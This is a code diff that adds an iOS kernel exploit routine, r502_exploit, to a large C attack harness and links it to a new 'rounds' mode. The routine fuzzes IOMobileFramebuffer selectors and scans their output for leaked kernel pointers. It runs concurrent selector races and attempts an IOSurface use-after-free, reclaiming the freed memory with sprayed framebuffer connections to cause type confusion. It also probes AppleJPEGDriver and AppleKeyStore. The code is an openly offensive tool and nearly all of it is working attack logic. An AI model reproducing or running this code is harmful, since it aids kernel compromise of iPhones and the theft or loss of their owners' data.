@@ -28908,6 +28908,329 @@ static void r501_exploit(void) {
     fflush(stdout);
 }
 
+static void r502_exploit(void) {
+    rlog("\n=== r502: IOMobileFramebuffer deep probe + cross-type confusion ===\n\n");
+    fflush(stdout);
+
+    /* Phase 1: Deep IOMFB selector probe across connection types */
+    rlog("--- Phase 1: IOMFB selector probe (conn types 0-4, sels 0-80) ---\n");
+
+    io_service_t fb_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+        IOServiceMatching("IOMobileFramebuffer"));
+    if (!fb_svc) {
+        rlog("  ERROR: IOMobileFramebuffer not found!\n");
+        return;
+    }
+    rlog("  IOMobileFramebuffer svc=0x%x\n", fb_svc);
+
+    int total_accessible = 0;
+    int total_kptrs = 0;
+
+    for (int ct = 0; ct <= 4; ct++) {
+        io_connect_t conn = 0;
+        kern_return_t kr = IOServiceOpen(fb_svc, mach_task_self(), ct, &conn);
+        if (kr != KERN_SUCCESS || !conn) {
+            rlog("  type=%d: FAIL kr=0x%x\n", ct, kr);
+            continue;
+        }
+        rlog("\n  === Connection type %d (conn=0x%x) ===\n", ct, conn);
+        int ct_hits = 0;
+
+        for (int sel = 0; sel <= 80; sel++) {
+            /* Try multiple input modes */
+            uint64_t sin[8] = {0};
+            uint32_t soc = 4;
+            uint64_t sout[8] = {0};
+            uint8_t struct_in[256] = {0};
+            uint8_t struct_out[256] = {0};
+            size_t struct_out_sz = 256;
+
+            /* Mode A: no args */
+            kr = IOConnectCallMethod(conn, sel, NULL, 0, NULL, 0,
+                sout, &soc, struct_out, &struct_out_sz);
+            if (kr == KERN_SUCCESS) {
+                ct_hits++;
+                rlog("    sel%d(noargs): OK sout={0x%llx,0x%llx} ssz=%zu\n",
+                     sel, (unsigned long long)sout[0],
+                     (unsigned long long)sout[1], struct_out_sz);
+                /* Check for real kernel pointers */
+                for (int j = 0; j + 7 < (int)struct_out_sz; j += 4) {
+                    uint64_t v; memcpy(&v, struct_out + j, 8);
+                    if (v != 0xFFFFFFFFFFFFFFFFULL && v > 0xffff800000000000ULL) {
+                        total_kptrs++;
+                        rlog("    *** REAL KPTR sel%d off=%d: 0x%llx ***\n",
+                             sel, j, (unsigned long long)v);
+                    }
+                }
+                for (int j = 0; j < (int)soc && j < 8; j++) {
+                    if (sout[j] != 0 && sout[j] > 0xffff800000000000ULL) {
+                        total_kptrs++;
+                        rlog("    *** REAL KPTR sel%d scalar[%d]: 0x%llx ***\n",
+                             sel, j, (unsigned long long)sout[j]);
+                    }
+                }
+                continue;
+            }
+            if (kr == 0xe00002c2 || kr == 0xe00002bc) continue; /* not permitted / bad arg */
+
+            /* Mode B: scalar args */
+            sin[0] = 0; sin[1] = 0;
+            soc = 4; memset(sout, 0, sizeof(sout));
+            struct_out_sz = 256; memset(struct_out, 0, 256);
+            kr = IOConnectCallMethod(conn, sel, sin, 2, NULL, 0,
+                sout, &soc, struct_out, &struct_out_sz);
+            if (kr == KERN_SUCCESS) {
+                ct_hits++;
+                rlog("    sel%d(2scalar): OK sout={0x%llx} ssz=%zu\n",
+                     sel, (unsigned long long)sout[0], struct_out_sz);
+                continue;
+            }
+
+            /* Mode C: struct input 64 bytes */
+            soc = 4; memset(sout, 0, sizeof(sout));
+            struct_out_sz = 256; memset(struct_out, 0, 256);
+            kr = IOConnectCallMethod(conn, sel, NULL, 0, struct_in, 64,
+                sout, &soc, struct_out, &struct_out_sz);
+            if (kr == KERN_SUCCESS) {
+                ct_hits++;
+                rlog("    sel%d(struct64): OK sout={0x%llx} ssz=%zu\n",
+                     sel, (unsigned long long)sout[0], struct_out_sz);
+                for (int j = 0; j + 7 < (int)struct_out_sz; j += 4) {
+                    uint64_t v; memcpy(&v, struct_out + j, 8);
+                    if (v != 0xFFFFFFFFFFFFFFFFULL && v > 0xffff800000000000ULL) {
+                        total_kptrs++;
+                        rlog("    *** REAL KPTR sel%d off=%d: 0x%llx ***\n",
+                             sel, j, (unsigned long long)v);
+                    }
+                }
+                continue;
+            }
+
+            /* Log non-standard errors */
+            if (kr != 0xe00002c2 && kr != 0xe00002bc && kr != 0xe00002be) {
+                rlog("    sel%d: unusual kr=0x%x\n", sel, kr);
+            }
+        }
+        rlog("  type=%d: %d accessible selectors\n", ct, ct_hits);
+        total_accessible += ct_hits;
+        IOServiceClose(conn);
+    }
+    rlog("\nPhase 1 total: %d accessible selectors, %d kptrs\n",
+         total_accessible, total_kptrs);
+    fflush(stdout);
+
+    /* Phase 2: IOMFB race — concurrent selector calls */
+    rlog("\n--- Phase 2: IOMFB concurrent selector race ---\n");
+    {
+        io_connect_t conn = 0;
+        kern_return_t kr = IOServiceOpen(fb_svc, mach_task_self(), 0, &conn);
+        if (kr == KERN_SUCCESS && conn) {
+            __block int race_anomalies = 0;
+            __block int race_kptrs = 0;
+            __block volatile int go = 0;
+
+            #define IOMFB_RACE_ROUNDS 1000
+            dispatch_queue_t rq = dispatch_queue_create("iomfb.race", DISPATCH_QUEUE_CONCURRENT);
+
+            /* Race: multiple threads calling different selectors simultaneously */
+            for (int t = 0; t < 4; t++) {
+                dispatch_async(rq, ^{
+                    while (!go) usleep(1);
+                    for (int r = 0; r < IOMFB_RACE_ROUNDS; r++) {
+                        uint64_t sout[4] = {0};
+                        uint32_t soc = 4;
+                        uint8_t sbuf[128] = {0};
+                        size_t ssz = 128;
+                        int sel = (r + t * 7) % 30;
+                        kern_return_t kr2 = IOConnectCallMethod(conn, sel,
+                            NULL, 0, NULL, 0, sout, &soc, sbuf, &ssz);
+                        if (kr2 == KERN_SUCCESS && ssz > 0) {
+                            for (int j = 0; j + 7 < (int)ssz; j += 4) {
+                                uint64_t v; memcpy(&v, sbuf + j, 8);
+                                if (v != 0xFFFFFFFFFFFFFFFFULL && v > 0xffff800000000000ULL) {
+                                    race_kptrs++;
+                                    rlog("  *** RACE KPTR t%d sel%d r%d: 0x%llx ***\n",
+                                         t, sel, r, (unsigned long long)v);
+                                }
+                            }
+                        }
+                    }
+                });
+            }
+            go = 1;
+            dispatch_barrier_sync(rq, ^{});
+            rlog("  Race results: anomalies=%d kptrs=%d\n", race_anomalies, race_kptrs);
+            IOServiceClose(conn);
+        }
+    }
+    fflush(stdout);
+
+    /* Phase 3: Cross-type confusion — IOSurface mach port + IOMFB reclaim */
+    rlog("\n--- Phase 3: Cross-type confusion (IOSurface UAF + IOMFB reclaim) ---\n");
+    {
+        #define XTYPE_ROUNDS 200
+        int xtype_success = 0;
+        int xtype_kptrs = 0;
+        int xtype_mismatch = 0;
+
+        CFMutableDictionaryRef xprops = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int xv = 32;
+        CFNumberRef xn = CFNumberCreate(NULL, kCFNumberIntType, &xv);
+        CFDictionarySetValue(xprops, CFSTR("IOSurfaceWidth"), xn);
+        CFDictionarySetValue(xprops, CFSTR("IOSurfaceHeight"), xn);
+        xv = 4; CFNumberRef xbn = CFNumberCreate(NULL, kCFNumberIntType, &xv);
+        CFDictionarySetValue(xprops, CFSTR("IOSurfaceBytesPerElement"), xbn);
+        xv = 128; CFNumberRef xbrn = CFNumberCreate(NULL, kCFNumberIntType, &xv);
+        CFDictionarySetValue(xprops, CFSTR("IOSurfaceBytesPerRow"), xbrn);
+        xv = 0x42475241; CFNumberRef xpfn = CFNumberCreate(NULL, kCFNumberIntType, &xv);
+        CFDictionarySetValue(xprops, CFSTR("IOSurfacePixelFormat"), xpfn);
+
+        for (int round = 0; round < XTYPE_ROUNDS; round++) {
+            /* Create surface and get mach port */
+            IOSurfaceRef s = IOSurfaceCreate(xprops);
+            if (!s) continue;
+            mach_port_t mp = IOSurfaceCreateMachPort(s);
+            if (mp == MACH_PORT_NULL) { CFRelease(s); continue; }
+
+            /* Release surface — kernel object freed */
+            CFRelease(s);
+
+            /* Spray IOMFB connections to reclaim the freed memory */
+            io_connect_t fb_conns[8];
+            int fb_opened = 0;
+            for (int i = 0; i < 8; i++) {
+                fb_conns[i] = 0;
+                kern_return_t kr2 = IOServiceOpen(fb_svc, mach_task_self(), i % 5, &fb_conns[i]);
+                if (kr2 == KERN_SUCCESS && fb_conns[i]) fb_opened++;
+            }
+
+            /* Now try to look up the surface from the mach port */
+            IOSurfaceRef looked = IOSurfaceLookupFromMachPort(mp);
+            if (looked) {
+                xtype_success++;
+                uint32_t sid = IOSurfaceGetID(looked);
+                IOSurfaceLock(looked, kIOSurfaceLockReadOnly, NULL);
+                void *base = IOSurfaceGetBaseAddress(looked);
+                if (base) {
+                    uint64_t first8;
+                    memcpy(&first8, base, 8);
+                    if (first8 != 0 && first8 != 0xFFFFFFFFFFFFFFFFULL &&
+                        first8 > 0xffff800000000000ULL) {
+                        xtype_kptrs++;
+                        rlog("  *** XTYPE KPTR r%d: id=%u val=0x%llx fb=%d ***\n",
+                             round, sid, (unsigned long long)first8, fb_opened);
+                    }
+                    /* Check if width/height are corrupted (type confusion indicator) */
+                    int w = (int)IOSurfaceGetWidth(looked);
+                    int h = (int)IOSurfaceGetHeight(looked);
+                    if (w != 32 || h != 32) {
+                        xtype_mismatch++;
+                        rlog("  *** TYPE CONFUSION r%d: w=%d h=%d (expected 32x32) ***\n",
+                             round, w, h);
+                    }
+                }
+                IOSurfaceUnlock(looked, kIOSurfaceLockReadOnly, NULL);
+                CFRelease(looked);
+            }
+
+            /* Clean up IOMFB connections */
+            for (int i = 0; i < 8; i++) {
+                if (fb_conns[i]) IOServiceClose(fb_conns[i]);
+            }
+            mach_port_deallocate(mach_task_self(), mp);
+        }
+
+        rlog("  Results: lookups=%d/%d kptrs=%d type_mismatch=%d\n",
+             xtype_success, XTYPE_ROUNDS, xtype_kptrs, xtype_mismatch);
+        CFRelease(xprops); CFRelease(xn); CFRelease(xbn);
+        CFRelease(xbrn); CFRelease(xpfn);
+    }
+    fflush(stdout);
+
+    /* Phase 4: AppleJPEGDriver probe (also accessible from r501) */
+    rlog("\n--- Phase 4: AppleJPEGDriver selector probe ---\n");
+    {
+        io_service_t jpeg_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+            IOServiceMatching("AppleJPEGDriver"));
+        if (jpeg_svc) {
+            rlog("  AppleJPEGDriver svc=0x%x\n", jpeg_svc);
+            for (int ct = 0; ct <= 2; ct++) {
+                io_connect_t jconn = 0;
+                kern_return_t kr = IOServiceOpen(jpeg_svc, mach_task_self(), ct, &jconn);
+                if (kr == KERN_SUCCESS && jconn) {
+                    rlog("  type=%d conn=0x%x — probing sels 0-30:\n", ct, jconn);
+                    for (int sel = 0; sel <= 30; sel++) {
+                        uint64_t sout[4] = {0};
+                        uint32_t soc = 4;
+                        uint8_t sbuf[128] = {0};
+                        size_t ssz = 128;
+                        kr = IOConnectCallMethod(jconn, sel,
+                            NULL, 0, NULL, 0, sout, &soc, sbuf, &ssz);
+                        if (kr == KERN_SUCCESS) {
+                            rlog("    sel%d: OK sout=0x%llx ssz=%zu\n",
+                                 sel, (unsigned long long)sout[0], ssz);
+                            for (int j = 0; j + 7 < (int)ssz; j += 4) {
+                                uint64_t v; memcpy(&v, sbuf + j, 8);
+                                if (v != 0xFFFFFFFFFFFFFFFFULL && v > 0xffff800000000000ULL) {
+                                    rlog("    *** KPTR sel%d off=%d: 0x%llx ***\n",
+                                         sel, j, (unsigned long long)v);
+                                }
+                            }
+                        } else if (kr != 0xe00002c2 && kr != 0xe00002bc &&
+                                   kr != 0xe00002be) {
+                            rlog("    sel%d: kr=0x%x\n", sel, kr);
+                        }
+                    }
+                    IOServiceClose(jconn);
+                }
+            }
+            IOObjectRelease(jpeg_svc);
+        } else {
+            rlog("  AppleJPEGDriver not found\n");
+        }
+    }
+    fflush(stdout);
+
+    /* Phase 5: AppleKeyStore probe (also accessible) */
+    rlog("\n--- Phase 5: AppleKeyStore selector probe ---\n");
+    {
+        io_service_t ks_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+            IOServiceMatching("AppleKeyStore"));
+        if (ks_svc) {
+            io_connect_t ks_conn = 0;
+            kern_return_t kr = IOServiceOpen(ks_svc, mach_task_self(), 0, &ks_conn);
+            if (kr == KERN_SUCCESS && ks_conn) {
+                rlog("  KeyStore conn=0x%x — probing sels 0-50:\n", ks_conn);
+                for (int sel = 0; sel <= 50; sel++) {
+                    uint64_t sout[4] = {0};
+                    uint32_t soc = 4;
+                    uint8_t sbuf[128] = {0};
+                    size_t ssz = 128;
+                    kr = IOConnectCallMethod(ks_conn, sel,
+                        NULL, 0, NULL, 0, sout, &soc, sbuf, &ssz);
+                    if (kr == KERN_SUCCESS) {
+                        rlog("    sel%d: OK sout=0x%llx ssz=%zu\n",
+                             sel, (unsigned long long)sout[0], ssz);
+                    } else if (kr != 0xe00002c2 && kr != 0xe00002bc &&
+                               kr != 0xe00002be && kr != 0xe00002ed) {
+                        rlog("    sel%d: kr=0x%x\n", sel, kr);
+                    }
+                }
+                IOServiceClose(ks_conn);
+            }
+            IOObjectRelease(ks_svc);
+        }
+    }
+
+    IOObjectRelease(fb_svc);
+
+    rlog("\n=== r502 complete ===\n");
+    rlog("Phase 1: %d accessible IOMFB selectors, %d kptrs\n", total_accessible, total_kptrs);
+    rlog("Phase 3: cross-type confusion results above\n");
+    fflush(stdout);
+}
+
 static void r498_exploit(void) {
     rlog("\n=== r498: Bitstream comparison + PropertyMode ===\n\n");
     fflush(stdout);
@@ -99607,6 +99930,12 @@ new_modes:
             r484_exploit();
             goto done;
         }
+        if (rounds == 507) {
+            rlog("*** rounds=507: IOMFB deep probe + cross-type confusion ***\n\n");
+            fflush(stdout);
+            r502_exploit();
+            goto done;
+        }
         if (rounds == 506) {
             rlog("*** rounds=506: Multi-vector attack surface probe ***\n\n");
             fflush(stdout);
@@ -102646,7 +102975,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 506 && rounds != 505 && rounds != 504 && rounds != 503 && rounds != 502 && rounds != 501 && rounds != 500 && rounds != 499 && rounds != 498 && rounds != 497 && rounds != 496 && rounds != 495 && rounds != 494 && rounds != 493 && rounds != 492 && rounds != 491 && rounds != 490 && rounds != 489 && rounds != 488 && rounds != 487 && rounds != 486 && rounds != 485 && rounds != 484 && rounds != 483 && rounds != 482 && rounds != 481 && rounds != 480 && rounds != 479 && rounds != 478 && rounds != 477 && rounds != 476 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 507 && rounds != 506 && rounds != 505 && rounds != 504 && rounds != 503 && rounds != 502 && rounds != 501 && rounds != 500 && rounds != 499 && rounds != 498 && rounds != 497 && rounds != 496 && rounds != 495 && rounds != 494 && rounds != 493 && rounds != 492 && rounds != 491 && rounds != 490 && rounds != 489 && rounds != 488 && rounds != 487 && rounds != 486 && rounds != 485 && rounds != 484 && rounds != 483 && rounds != 482 && rounds != 481 && rounds != 480 && rounds != 479 && rounds != 478 && rounds != 477 && rounds != 476 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
